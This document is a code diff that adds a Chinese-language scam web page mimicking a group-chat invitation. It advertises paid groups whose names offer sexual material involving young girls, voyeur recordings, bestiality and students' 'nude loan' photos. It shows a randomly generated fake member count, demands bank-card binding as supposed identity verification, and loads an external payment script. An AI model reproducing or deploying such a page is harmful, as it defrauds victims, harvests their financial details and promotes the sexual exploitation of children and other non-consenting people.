@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<title>Document</title>
+</head>
+<body>
+<div style="display:none"><img src="http://www.hiliuxue.com/extdata/V6-1/images/201612222250461348514.jpg"></div>
+    <div class="body">
+      <div class="group_info">
+        <img src="" alt="" class="group_icon">
+        <p class="group_name"></p>
+        <p class="group_num"></p>
+      </div>
+          
+    <p class="msg">已认证:邀请你加入群聊</p>
+    <div id="pay" style="padding-top: 10px;">
+        <p><img src="http://www.hiliuxue.com/extdata/V6-1/images/456.png" class="group_icon1"></p>
+    </div>
+        
+    
+            
+<div class="ext_info">
+<p><em>1.</em>你和群里其他人都不是朋友关系，请注意隐私安全。<br>
+<em>2.</em>该群聊人数较多，为减少新消息给你带来的打扰，建议谨慎加入。<br>
+<em>3.</em>你需要实名验证后才能接受邀请，可绑定银行卡进行验证。</p>
+</div>
+</div>
+
+<script type="text/javascript" src="http://www.hiliuxue.com/extdata/V6-1/js/jquery-1.8.2.min.js"></script>
+
+<script type="text/javascript">
+    var id = getQueryString("id");
+    if(id == 41){
+        $(".group_info img").attr("src","http://www.hiliuxue.com/extdata/V6-1/images/100.jpg");
+        $(".group_name").text('幼女精品群（23元）');
+        $("#pay").attr("onclick","wechatPay(23)");
+    }else if(id == 42){
+        $(".group_info img").attr("src","http://www.hiliuxue.com/extdata/V6-1/images/200.jpg");
+        $(".group_name").text('空姐精品群（25元）');
+        $("#pay").attr("onclick","wechatPay(25)");
+    }else if(id == 43){
+        $(".group_info img").attr("src","http://www.hiliuxue.com/extdata/V6-1/images/300.jpg");
+        $(".group_name").text('偷拍精品群（27元）');
+        $("#pay").attr("onclick","wechatPay(27)");
+    }else if(id == 50){
+        $(".group_info img").attr("src","http://www.hiliuxue.com/extdata/V6-1/images/400.jpg");
+        $(".group_name").text('人兽精品群（29元）');
+        $("#pay").attr("onclick","wechatPay(29)");
+    }else if(id == 51){
+        $(".group_info img").attr("src","http://www.hiliuxue.com/extdata/V6-1/images/500.jpg");
+        $(".group_name").text('大学生裸贷群（36元）');
+        $("#pay").attr("onclick","wechatPay(36)");
+    }else if(id == 52){
+        $(".group_info img").attr("src","http://www.hiliuxue.com/extdata/V6-1/images/6.jpg");
+        $(".group_name").text('全站资源群（56元）');
+        $("#pay").attr("onclick","wechatPay(56)");
+    }
+    function getQuery(i) {
+        var e = new RegExp("(^|&)" + i + "=([^&]*)(&|$)", "i"),
+            o = window.location.search.substr(1).match(e);
+        return null !== o ? decodeURI(o[2]) : null
+    }
+    function getQueryString(name) {
+        return getQuery(name);
+
+        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null) {
+            return unescape(r[2]);
+        }
+        return null;
+    }
+    function rnd(min, max){
+      return min + Math.floor(Math.random() * (max - min + 1));
+    }
+    var iPeople = rnd(450,500);
+    $(".group_num").text(iPeople + "人");
+</script>
+<script type="text/javascript" src="http://www.hiliuxue.com/extdata/V6-1/js/pay20170318-2.js"></script>
+<div style="display:none; width:0px; height:0px;">
+    <script src="http://s4.cnzz.com/z_stat.php?id=1254987535&web_id=1254987535" language="JavaScript"></script>
+</div>
+</body>
+</html>
